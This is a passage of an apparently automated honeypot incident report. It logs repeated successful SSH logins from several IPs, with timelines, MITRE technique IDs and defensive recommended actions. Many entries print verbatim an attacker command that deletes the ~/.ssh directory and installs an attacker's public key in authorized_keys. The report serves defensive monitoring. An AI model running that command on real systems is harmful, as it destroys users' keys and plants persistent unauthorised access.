| `2026-04-20 21:07:06` | `cowrie.session.connect` |
| `2026-04-20 21:07:06` | `cowrie.client.version` |
| `2026-04-20 21:07:06` | `cowrie.client.kex` |
| `2026-04-20 21:07:07` | `cowrie.login.success` |
| `2026-04-20 21:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e76fd9d0842

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:08 |
| **Last Seen** | 2026-04-20 21:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:08:51` | `cowrie.session.connect` |
| `2026-04-20 21:08:53` | `cowrie.client.version` |
| `2026-04-20 21:08:53` | `cowrie.client.kex` |
| `2026-04-20 21:08:54` | `cowrie.login.success` |
| `2026-04-20 21:08:54` | `cowrie.session.params` |
| `2026-04-20 21:08:54` | `cowrie.command.input` |
| `2026-04-20 21:08:54` | `cowrie.command.failed` |
| `2026-04-20 21:08:54` | `cowrie.log.closed` |
| `2026-04-20 21:08:55` | `cowrie.session.params` |
| `2026-04-20 21:08:55` | `cowrie.command.input` |
| `2026-04-20 21:08:55` | `cowrie.session.file_download` |
| `2026-04-20 21:08:55` | `cowrie.log.closed` |
| `2026-04-20 21:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88ebeee5e51e

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:08 |
| **Last Seen** | 2026-04-20 21:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:08:58` | `cowrie.session.connect` |
| `2026-04-20 21:08:58` | `cowrie.client.version` |
| `2026-04-20 21:08:59` | `cowrie.client.kex` |
| `2026-04-20 21:08:59` | `cowrie.login.success` |
| `2026-04-20 21:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d681e0ab01

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:09 |
| **Last Seen** | 2026-04-20 21:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:09:47` | `cowrie.session.connect` |
| `2026-04-20 21:09:47` | `cowrie.client.version` |
| `2026-04-20 21:09:47` | `cowrie.client.kex` |
| `2026-04-20 21:09:48` | `cowrie.login.success` |
| `2026-04-20 21:09:48` | `cowrie.session.params` |
| `2026-04-20 21:09:48` | `cowrie.command.input` |
| `2026-04-20 21:09:48` | `cowrie.command.failed` |
| `2026-04-20 21:09:48` | `cowrie.log.closed` |
| `2026-04-20 21:09:49` | `cowrie.session.params` |
| `2026-04-20 21:09:49` | `cowrie.command.input` |
| `2026-04-20 21:09:49` | `cowrie.session.file_download` |
| `2026-04-20 21:09:49` | `cowrie.log.closed` |
| `2026-04-20 21:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7520cc2e9bc

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:09 |
| **Last Seen** | 2026-04-20 21:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:09:51` | `cowrie.session.connect` |
| `2026-04-20 21:09:51` | `cowrie.client.version` |
| `2026-04-20 21:09:51` | `cowrie.client.kex` |
| `2026-04-20 21:09:52` | `cowrie.login.success` |
| `2026-04-20 21:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ce07fe096f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.253[.]205` |
| **First Seen** | 2026-04-20 21:10 |
| **Last Seen** | 2026-04-20 21:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:10:15` | `cowrie.session.connect` |
| `2026-04-20 21:10:15` | `cowrie.client.version` |
| `2026-04-20 21:10:15` | `cowrie.client.kex` |
| `2026-04-20 21:10:15` | `cowrie.login.success` |
| `2026-04-20 21:10:16` | `cowrie.session.params` |
| `2026-04-20 21:10:16` | `cowrie.command.input` |
| `2026-04-20 21:10:16` | `cowrie.command.failed` |
| `2026-04-20 21:10:16` | `cowrie.log.closed` |
| `2026-04-20 21:10:16` | `cowrie.session.params` |
| `2026-04-20 21:10:16` | `cowrie.command.input` |
| `2026-04-20 21:10:16` | `cowrie.session.file_download` |
| `2026-04-20 21:10:16` | `cowrie.log.closed` |
| `2026-04-20 21:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.253[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.32.253[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f7cb2f38fd

| Field | Detail |
|---|---|
| **Source IP** | `152.32.253[.]205` |
| **First Seen** | 2026-04-20 21:10 |
| **Last Seen** | 2026-04-20 21:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:10:18` | `cowrie.session.connect` |
| `2026-04-20 21:10:18` | `cowrie.client.version` |
| `2026-04-20 21:10:18` | `cowrie.client.kex` |
| `2026-04-20 21:10:18` | `cowrie.login.success` |
| `2026-04-20 21:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.253[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.32.253[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c389ac68cb

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:11 |
| **Last Seen** | 2026-04-20 21:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:11:33` | `cowrie.session.connect` |
| `2026-04-20 21:11:33` | `cowrie.client.version` |
| `2026-04-20 21:11:33` | `cowrie.client.kex` |
| `2026-04-20 21:11:34` | `cowrie.login.success` |
| `2026-04-20 21:11:34` | `cowrie.session.params` |
| `2026-04-20 21:11:34` | `cowrie.command.input` |
| `2026-04-20 21:11:34` | `cowrie.command.failed` |
| `2026-04-20 21:11:34` | `cowrie.log.closed` |
| `2026-04-20 21:11:35` | `cowrie.session.params` |
| `2026-04-20 21:11:35` | `cowrie.command.input` |
| `2026-04-20 21:11:35` | `cowrie.session.file_download` |
| `2026-04-20 21:11:35` | `cowrie.log.closed` |
| `2026-04-20 21:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e068b5819bd1

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:11 |
| **Last Seen** | 2026-04-20 21:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:11:37` | `cowrie.session.connect` |
| `2026-04-20 21:11:37` | `cowrie.client.version` |
| `2026-04-20 21:11:38` | `cowrie.client.kex` |
| `2026-04-20 21:11:38` | `cowrie.login.success` |
| `2026-04-20 21:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b388c13f9c5c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.131[.]112` |
| **First Seen** | 2026-04-20 21:11 |
| **Last Seen** | 2026-04-20 21:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:11:47` | `cowrie.session.connect` |
| `2026-04-20 21:11:47` | `cowrie.client.version` |
| `2026-04-20 21:11:47` | `cowrie.client.kex` |
| `2026-04-20 21:11:47` | `cowrie.login.success` |
| `2026-04-20 21:11:48` | `cowrie.session.params` |
| `2026-04-20 21:11:48` | `cowrie.command.input` |
| `2026-04-20 21:11:48` | `cowrie.command.failed` |
| `2026-04-20 21:11:48` | `cowrie.log.closed` |
| `2026-04-20 21:11:48` | `cowrie.session.params` |
| `2026-04-20 21:11:48` | `cowrie.command.input` |
| `2026-04-20 21:11:48` | `cowrie.session.file_download` |
| `2026-04-20 21:11:48` | `cowrie.log.closed` |
| `2026-04-20 21:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.131[.]112` to AbuseIPDB if not already reported
- [ ] Block `152.32.131[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b92e18404422

| Field | Detail |
|---|---|
| **Source IP** | `152.32.131[.]112` |
| **First Seen** | 2026-04-20 21:11 |
| **Last Seen** | 2026-04-20 21:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:11:50` | `cowrie.session.connect` |
| `2026-04-20 21:11:50` | `cowrie.client.version` |
| `2026-04-20 21:11:50` | `cowrie.client.kex` |
| `2026-04-20 21:11:51` | `cowrie.login.success` |
| `2026-04-20 21:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.131[.]112` to AbuseIPDB if not already reported
- [ ] Block `152.32.131[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1e064ba009

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:12 |
| **Last Seen** | 2026-04-20 21:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:12:22` | `cowrie.session.connect` |
| `2026-04-20 21:12:22` | `cowrie.client.version` |
| `2026-04-20 21:12:22` | `cowrie.client.kex` |
| `2026-04-20 21:12:23` | `cowrie.login.success` |
| `2026-04-20 21:12:23` | `cowrie.session.params` |
| `2026-04-20 21:12:23` | `cowrie.command.input` |
| `2026-04-20 21:12:23` | `cowrie.command.failed` |
| `2026-04-20 21:12:23` | `cowrie.log.closed` |
| `2026-04-20 21:12:24` | `cowrie.session.params` |
| `2026-04-20 21:12:24` | `cowrie.command.input` |
| `2026-04-20 21:12:24` | `cowrie.session.file_download` |
| `2026-04-20 21:12:24` | `cowrie.log.closed` |
| `2026-04-20 21:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f56ecb52d7

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:12 |
| **Last Seen** | 2026-04-20 21:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:12:27` | `cowrie.session.connect` |
| `2026-04-20 21:12:27` | `cowrie.client.version` |
| `2026-04-20 21:12:27` | `cowrie.client.kex` |
| `2026-04-20 21:12:28` | `cowrie.login.success` |
| `2026-04-20 21:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62df03cfef6

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:15 |
| **Last Seen** | 2026-04-20 21:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:15:46` | `cowrie.session.connect` |
| `2026-04-20 21:15:46` | `cowrie.client.version` |
| `2026-04-20 21:15:46` | `cowrie.client.kex` |
| `2026-04-20 21:15:47` | `cowrie.login.success` |
| `2026-04-20 21:15:48` | `cowrie.session.params` |
| `2026-04-20 21:15:48` | `cowrie.command.input` |
| `2026-04-20 21:15:48` | `cowrie.command.failed` |
| `2026-04-20 21:15:48` | `cowrie.log.closed` |
| `2026-04-20 21:15:48` | `cowrie.session.params` |
| `2026-04-20 21:15:48` | `cowrie.command.input` |
| `2026-04-20 21:15:48` | `cowrie.session.file_download` |
| `2026-04-20 21:15:48` | `cowrie.log.closed` |
| `2026-04-20 21:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18cd57f24b24

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:15 |
| **Last Seen** | 2026-04-20 21:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:15:53` | `cowrie.session.connect` |
| `2026-04-20 21:15:53` | `cowrie.client.version` |
| `2026-04-20 21:15:53` | `cowrie.client.kex` |
| `2026-04-20 21:15:54` | `cowrie.login.success` |
| `2026-04-20 21:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198c4734a576

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:18 |
| **Last Seen** | 2026-04-20 21:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:18:37` | `cowrie.session.connect` |
| `2026-04-20 21:18:37` | `cowrie.client.version` |
| `2026-04-20 21:18:38` | `cowrie.client.kex` |
| `2026-04-20 21:18:38` | `cowrie.login.success` |
| `2026-04-20 21:18:39` | `cowrie.session.params` |
| `2026-04-20 21:18:39` | `cowrie.command.input` |
| `2026-04-20 21:18:39` | `cowrie.command.failed` |
| `2026-04-20 21:18:39` | `cowrie.log.closed` |
| `2026-04-20 21:18:39` | `cowrie.session.params` |
| `2026-04-20 21:18:39` | `cowrie.command.input` |
| `2026-04-20 21:18:40` | `cowrie.session.file_download` |
| `2026-04-20 21:18:40` | `cowrie.log.closed` |
| `2026-04-20 21:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b14679d5a4a

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:18 |
| **Last Seen** | 2026-04-20 21:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:18:42` | `cowrie.session.connect` |
| `2026-04-20 21:18:42` | `cowrie.client.version` |
| `2026-04-20 21:18:42` | `cowrie.client.kex` |
| `2026-04-20 21:18:43` | `cowrie.login.success` |
| `2026-04-20 21:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8426b031af2

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:19 |
| **Last Seen** | 2026-04-20 21:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
